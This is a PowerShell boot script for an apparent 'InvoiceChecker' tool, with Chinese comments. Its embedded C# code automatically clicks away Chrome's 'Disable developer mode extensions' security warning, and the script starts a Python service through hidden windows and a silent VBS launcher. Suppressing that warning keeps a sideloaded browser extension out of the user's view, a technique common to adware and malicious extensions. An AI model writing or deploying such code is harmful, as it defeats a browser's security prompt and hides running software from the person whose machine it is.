# InvoiceChecker开机守护脚本 v3.4
# 日期: 2026-06-23  制作人: 陆琦
# 启动服务并自动关闭开发者模式警告弹窗
$ErrorActionPreference = "Continue"
Add-Type -AssemblyName System.Windows.Forms

# === 自动关闭开发者模式扩展警告弹窗 ===
try {
    Add-Type -ReferencedAssemblies System.Windows.Forms -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
using System.Threading;

public class DevModeGuard {
    [DllImport("user32.dll", CharSet = CharSet.Unicode)]
    static extern IntPtr FindWindow(string cls, string title);
    [DllImport("user32.dll", CharSet = CharSet.Unicode)]
    static extern IntPtr FindWindowEx(IntPtr parent, IntPtr after, string cls, string title);
    [DllImport("user32.dll")]
    static extern IntPtr SendMessage(IntPtr hWnd, uint Msg, IntPtr wParam, IntPtr lParam);
    const uint BM_CLICK = 0x00F5;
    const uint WM_CLOSE = 0x0010;
    public static void Watch() {
        var t = new Thread(() => {
            for (int i = 0; i < 240; i++) {
                Thread.Sleep(500);
                IntPtr dlg = FindWindow(null, "\u5173\u95ed\u5f00\u53d1\u4eba\u5458\u6a21\u5f0f\u4e0b\u7684\u6269\u5c55");
                if (dlg == IntPtr.Zero)
                    dlg = FindWindow(null, "Disable developer mode extensions");
                if (dlg != IntPtr.Zero) {
                    IntPtr btn = FindWindowEx(dlg, IntPtr.Zero, "Button", "\u4ee5\u540e\u518d\u8bf4");
                    if (btn == IntPtr.Zero)
                        btn = FindWindowEx(dlg, IntPtr.Zero, "Button", "Later");
                    if (btn == IntPtr.Zero)
                        btn = FindWindowEx(dlg, IntPtr.Zero, "Button", "Cancel");
                    if (btn != IntPtr.Zero)
                        SendMessage(btn, BM_CLICK, IntPtr.Zero, IntPtr.Zero);
                    else
                        SendMessage(dlg, WM_CLOSE, IntPtr.Zero, IntPtr.Zero);
                    Thread.Sleep(1000);
                }
            }
        });
        t.IsBackground = true;
        t.SetApartmentState(ApartmentState.STA);
        t.Start();
    }
}
"@
    [DevModeGuard]::Watch()
} catch {}

# === 启动Python服务 ===
$svcRoot = $PSScriptRoot
if (-not $svcRoot) { $svcRoot = Split-Path -Parent $MyInvocation.MyCommand.Path }
if (-not (Test-Path "$svcRoot\start_silent.vbs")) {
    $svcRoot = Join-Path $env:LOCALAPPDATA "InvoiceChecker\service"
}

# 检查服务是否已在运行
$svcStarted = $false
try {
    $r = Invoke-WebRequest -Uri "http://127.0.0.1:52100/test" -UseBasicParsing -TimeoutSec 3
    $svcStarted = $true
} catch {}

if (-not $svcStarted) {
    Start-Process wscript -ArgumentList """$svcRoot\start_silent.vbs""" -WindowStyle Hidden
    Start-Sleep -Seconds 5
}

# 如果VBS启动失败，回退到直接Python启动
$svcStarted = $false
try {
    $r = Invoke-WebRequest -Uri "http://127.0.0.1:52100/test" -UseBasicParsing -TimeoutSec 3
    $svcStarted = $true
} catch {}
if (-not $svcStarted) {
    $embPy = Join-Path $env:LOCALAPPDATA "InvoiceChecker\python\python.exe"
    if (Test-Path $embPy) {
        Start-Process $embPy -ArgumentList "$svcRoot\invoice_checker.py" -WindowStyle Hidden
    } else {
        $sysPy = Get-Command python -ErrorAction SilentlyContinue
        if ($sysPy) { Start-Process python -ArgumentList "$svcRoot\invoice_checker.py" -WindowStyle Hidden }
    }
    Start-Sleep -Seconds 3
}
